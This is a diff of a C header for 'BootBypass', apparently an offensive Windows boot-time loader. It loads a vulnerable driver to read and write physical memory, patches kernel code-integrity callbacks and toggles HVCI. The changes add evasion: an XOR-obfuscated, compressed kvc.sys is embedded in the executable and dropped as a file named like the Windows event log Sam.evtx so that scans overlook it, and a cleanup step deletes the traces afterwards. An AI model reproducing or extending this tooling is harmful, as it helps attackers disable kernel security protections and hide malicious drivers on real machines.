@@ -2,16 +2,23 @@
 #define BOOT_BYPASS_H
 
 // ============================================================================
-// BootBypass — NATIVE subsystem driver loader (kvc_smss)
+// BootBypass — NATIVE subsystem driver loader (BB variant)
 //
 // Runs at SMSS phase (before any Win32 subsystem).  No CRT, no stdlib.
 // Every type, structure, and API call is declared here from first principles
 // because NODEFAULTLIB means no SDK headers are included.
 //
 // Entry: NtProcessStartup (SUBSYSTEM:NATIVE), called by the NT kernel directly.
-// Stack: 1 MB reserved / 1 MB committed (explicit — compiler default is 1 MB
-//        reserved but only 8 KB committed; the explicit commit prevents guard-
-//        page faults during large stack frames in a no-SEH environment).
+// Stack: 1 MB reserved / 1 MB committed — explicit commit prevents guard-page
+//        faults during large stack frames in a no-SEH environment.
+//
+// Driver deployment strategy (BB-specific):
+//   kvc.sys is embedded in the PE as resource IDR_DRV1 (type 10, id 101).
+//   The payload is XOR-obfuscated then LZNT1-compressed.  At runtime:
+//     ExtractkvcFromResource() → XOR decrypt → RtlDecompressBuffer(LZNT1)
+//     → NtCreateFile to \SystemRoot\System32\winevt\Logs\Sam.evtx
+//   The .evtx extension disguises the driver file as a Windows event log.
+//   Cleanupkvc() removes both the file and the SCM registry key after use.
 // ============================================================================
 
 #pragma comment(lib, "ntdll.lib")
@@ -20,7 +27,7 @@
 // STACK           — 1 MB reserved + 1 MB committed: avoids guard-page faults.
 #pragma comment(linker, "/SUBSYSTEM:NATIVE /ENTRY:NtProcessStartup /NODEFAULTLIB /STACK:0x100000,0x100000")
 // Disable optimizations globally: prevents the compiler from reordering or
-// eliminating stores that are critical in the no-exception-handler environment.
+// eliminating stores critical in the no-exception-handler environment.
 #pragma optimize("", off)
 // Disable stack probes: __chkstk is defined manually in SystemUtils.c.
 #pragma check_stack(off)
@@ -78,18 +85,19 @@
 #define REG_EXPAND_SZ 2
 #define REG_DWORD 4
 #define REG_MULTI_SZ 7
+#define REG_QWORD    11
 #define MAX_ENTRIES 64           // maximum driver entries parsed from drivers.ini
 #define MAX_PATH_LEN 512         // buffer size in WCHARs for all path strings
 
-// Native-namespace path — accessible before the drive letter symlinks exist.
+// Native-namespace path — accessible before drive letter symlinks exist.
 #define STATE_FILE_PATH L"\\SystemRoot\\drivers.ini"
+
+// Drop path for the extracted kvc.sys binary.  The .evtx extension disguises
+// the driver file as a Windows event log to avoid cursory file-system scans.
+#define kvc_Log L"\\SystemRoot\\System32\\winevt\\Logs\\Sam.evtx"
 
 // DeviceGuard registry key for HVCI (Enabled DWORD).
 #define HVCI_REG_PATH L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"
-
-// DriverStore FileRepository root and wildcard for kvc.sys package directory.
-#define DRIVERSTORE_REPO    L"\\SystemRoot\\System32\\DriverStore\\FileRepository"
-#define DRIVERSTORE_PATTERN L"avc.inf_amd64_*"
 
 // ============================================================================
 // TYPE SYSTEM
@@ -305,22 +313,6 @@ typedef struct _SYSTEM_MODULE_INFORMATION {
 } SYSTEM_MODULE_INFORMATION;
 
 // ============================================================================
-// OFFSET SOURCE — controls how ntoskrnl offsets are resolved at runtime.
-//
-//   AUTO    : use INI offsets when present; fall back to heuristic scanner.
-//   SCAN    : always scan ntoskrnl.exe on disk regardless of INI values.
-//   PDB     : use offsets pre-written by kvc.exe from a cached PDB (fastest).
-//   PDB_SCAN: PDB first; scanner as fallback if PDB lookup failed.
-//
-// kvc.exe sets PDB after a successful PDB resolution and writes offsets to
-// drivers.ini, so the next boot typically runs in PDB mode with zero scan cost.
-// ============================================================================
-#define OFFSET_SOURCE_AUTO     0
-#define OFFSET_SOURCE_SCAN     1
-#define OFFSET_SOURCE_PDB      2
-#define OFFSET_SOURCE_PDB_SCAN 3
-
-// ============================================================================
 // INI STRUCTURES — parsed from [Config] section and per-driver sections.
 // ============================================================================
 
@@ -333,6 +325,8 @@ typedef enum _ACTION_TYPE {
 } ACTION_TYPE;
 
 // Global settings from [Config] section.
+// Note: no OffsetSource field — BB always scans ntoskrnl.exe when offsets
+// are missing from the INI (equivalent to AUTO mode in the kvc_smss variant).
 typedef struct _CONFIG_SETTINGS {
     BOOLEAN Execute;                    // YES/NO: master switch; NO exits immediately
     BOOLEAN RestoreHVCI;                // YES/NO: re-enable HVCI in hive after run
@@ -340,7 +334,6 @@ typedef struct _CONFIG_SETTINGS {
     WCHAR DriverDevice[MAX_PATH_LEN];   // device path for the vulnerability driver
     ULONG IoControlCode_Read;           // IOCTL code for physical memory read
     ULONG IoControlCode_Write;          // IOCTL code for physical memory write
-    ULONG OffsetSource;                 // OFFSET_SOURCE_* constant
     ULONGLONG Offset_SeCiCallbacks;     // RVA of SeCiCallbacks in ntoskrnl
     ULONGLONG Offset_Callback;          // offset of the patchable slot within SeCiCallbacks
     ULONGLONG Offset_SafeFunction;      // RVA of the no-op safe function in ntoskrnl
@@ -432,6 +425,11 @@ __declspec(dllimport) NTSTATUS NTAPI NtDeviceIoControlFile(HANDLE FileHandle, HA
 __declspec(dllimport) NTSTATUS NTAPI NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);
 __declspec(dllimport) NTSTATUS NTAPI NtShutdownSystem(ULONG Action);
 __declspec(dllimport) NTSTATUS NTAPI NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock);
+// Used to decompress the kvc.sys payload embedded in the PE resource section.
+__declspec(dllimport) NTSTATUS NTAPI RtlDecompressBuffer(USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize);
+
+// LZNT1 is the compression format used for the embedded driver resource.
+#define COMPRESSION_FORMAT_LZNT1 0x0002
 
 #define InitializeObjectAttributes(p, n, a, r, s) \
     (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
